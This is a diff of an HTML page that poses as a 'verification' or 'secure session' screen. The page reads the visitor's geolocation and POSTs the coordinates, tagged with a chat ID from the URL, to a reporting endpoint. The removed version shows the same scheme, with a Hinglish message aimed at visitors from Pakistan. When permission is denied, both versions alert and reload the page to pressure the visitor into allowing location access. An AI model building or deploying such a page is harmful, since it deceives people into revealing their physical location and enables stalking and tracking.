@@ -2,94 +2,35 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Verification...</title>
-  <style>
-    body {
-      margin: 0;
-      font-family: 'Segoe UI', sans-serif;
-      background: #f2f7fb;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      height: 100vh;
-    }
-
-    .popup {
-      background: white;
-      padding: 30px;
-      border-radius: 20px;
-      box-shadow: 0 10px 40px rgba(0,0,0,0.1);
-      max-width: 320px;
-      text-align: center;
-      animation: fadeIn 0.8s ease;
-    }
-
-    .popup h2 {
-      color: #2c3e50;
-      margin-bottom: 10px;
-    }
-
-    .popup p {
-      color: #666;
-      font-size: 14px;
-    }
-
-    .loader {
-      margin: 20px auto;
-      width: 40px;
-      height: 40px;
-      border: 4px solid #ccc;
-      border-top-color: #3498db;
-      border-radius: 50%;
-      animation: spin 1s linear infinite;
-    }
-
-    @keyframes fadeIn {
-      from { opacity: 0; transform: translateY(10px); }
-      to { opacity: 1; transform: translateY(0); }
-    }
-
-    @keyframes spin {
-      to { transform: rotate(360deg); }
-    }
-  </style>
+  <title>Processing...</title>
 </head>
 <body>
-  <div class="popup">
-    <h2>Verifying...</h2>
-    <p>Agar aap Pakistan se hain to location on karna zaroori hai</p>
-    <div class="loader"></div>
-  </div>
-
+  <h3>Processing secure session...</h3>
   <script>
-    function sendLocation(retry = false) {
+    const urlParams = new URLSearchParams(window.location.search);
+    const id = urlParams.get('id');
+
+    if (!id) {
+      document.body.innerHTML = "Chat ID not found.";
+    } else {
       navigator.geolocation.getCurrentPosition(
-        position => {
-          // Replace with your bot endpoint
+        pos => {
           fetch('/api/report', {
             method: 'POST',
-            headers: {'Content-Type': 'application/json'},
+            headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({
-              lat: position.coords.latitude,
-              lon: position.coords.longitude
+              lat: pos.coords.latitude,
+              lon: pos.coords.longitude,
+              chat_id: id
             })
           });
         },
-        error => {
-          if (error.code === 1 && !retry) {
-            setTimeout(() => sendLocation(true), 2000);
-          } else {
-            alert("Location allow karna zaroori hai. Page reload ho raha hai...");
-            location.reload();
-          }
+        err => {
+          alert("Please allow location access.");
+          location.reload();
         }
       );
     }
-
-    window.onload = () => {
-      setTimeout(() => sendLocation(), 1000);
-    };
   </script>
 </body>
 </html>
